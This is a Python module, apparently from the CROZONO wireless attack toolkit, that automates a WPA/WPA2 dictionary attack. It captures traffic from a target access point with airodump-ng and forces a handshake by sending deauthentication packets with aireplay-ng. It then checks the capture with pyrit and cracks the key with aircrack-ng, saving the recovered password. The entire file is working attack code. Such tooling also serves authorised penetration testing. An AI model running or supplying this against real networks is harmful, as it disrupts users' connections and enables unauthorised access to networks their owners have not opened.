#!/usr/bin/env python3
"""
--------------------------------------------------------------------------------
	CROZONO - 22.02.16.20.00.00 - www.crozono.com - info@crozono.com

	WLAN - WPA/WPA2 attack module - Dictionary Attack
--------------------------------------------------------------------------------

"""
__PRIORITY__ = 0

import os
import time
import pexpect
import subprocess
import src.settings as settings

from poormanslogging import info, warn, error
from src.attacks.base_attack import BaseAttack


class wpa_dictionary(BaseAttack):

	def __init__(self, p):
		pass

	def run(self):
		proc_airodump = subprocess.Popen(['airodump-ng', '--bssid', settings.TARGET_BSSID, '-c', settings.TARGET_CHANNEL, '-w', 'cr0z0n0_attack', settings.INTERFACE_MON],
							stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

		info("Trying to get the handshake (sending deauthentication packets...)")
		cmd_aireplay = pexpect.spawn('aireplay-ng -0 10 -a {0} {1}'.format(settings.TARGET_BSSID, settings.INTERFACE_MON))
		time.sleep(10)
		cmd_aireplay.close()
		time.sleep(settings.WPA_EXPECT_HANDSHAKE_TIME)

		cmd_pyrit = pexpect.spawn('pyrit -r cr0z0n0_attack-01.cap analyze')
		cmd_pyrit.logfile = open(settings.LOG_FILE, 'wb')
		cmd_pyrit.expect(['No valid', 'good', pexpect.TIMEOUT, pexpect.EOF])
		cmd_pyrit.close()

		handshake = True
		parse_log_pyrit = open(settings.LOG_FILE, 'r')
		for line in parse_log_pyrit:
			if "No valid" in line:
				warn("We couldn't get the handshake :-(")
				handshake = False
		parse_log_pyrit.close()
		os.remove(settings.LOG_FILE)	

		if handshake != False:
			info("We have something :-) Making a dictionary attack...")
			cmd_crack = pexpect.spawn('aircrack-ng -w dictionary_wpa2 cr0z0n0_attack-01.cap')
			cmd_crack.logfile = open(settings.LOG_FILE, 'wb')
			cmd_crack.expect(['KEY FOUND!', 'Failed', pexpect.TIMEOUT, pexpect.EOF])
			cmd_crack.close()

			parse_log_crack = open(settings.LOG_FILE, 'r')
			for line in parse_log_crack:
				wh = line.find('KEY FOUND!')
				if wh > -1:
					key_end = line.find(']')
					settings.TARGET_KEY = line[wh + 13:key_end]
					break
			parse_log_crack.close()
			os.remove(settings.LOG_FILE)
			if settings.TARGET_KEY is None:
				warn("Dictionary attack failed!")

	def setup(self):
		#  Delete old files:
		if os.path.exists(os.path.join(settings.OS_PATH,'cr0z0n0_attack-01.csv')):
			os.remove(os.path.join(settings.OS_PATH,'cr0z0n0_attack-01.csv'))
			os.remove(os.path.join(settings.OS_PATH,'cr0z0n0_attack-01.cap'))
			os.remove(os.path.join(settings.OS_PATH,'cr0z0n0_attack-01.kismet.csv'))
			os.remove(os.path.join(settings.OS_PATH,'cr0z0n0_attack-01.kismet.netxml'))

	def check(self):
		deps = ["aircrack-ng","pyrit"]
		for d in deps:
			if subprocess.call(["which", d],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
				error("Required binary for {bin} not found.".format(bin=d))
				return False
		return True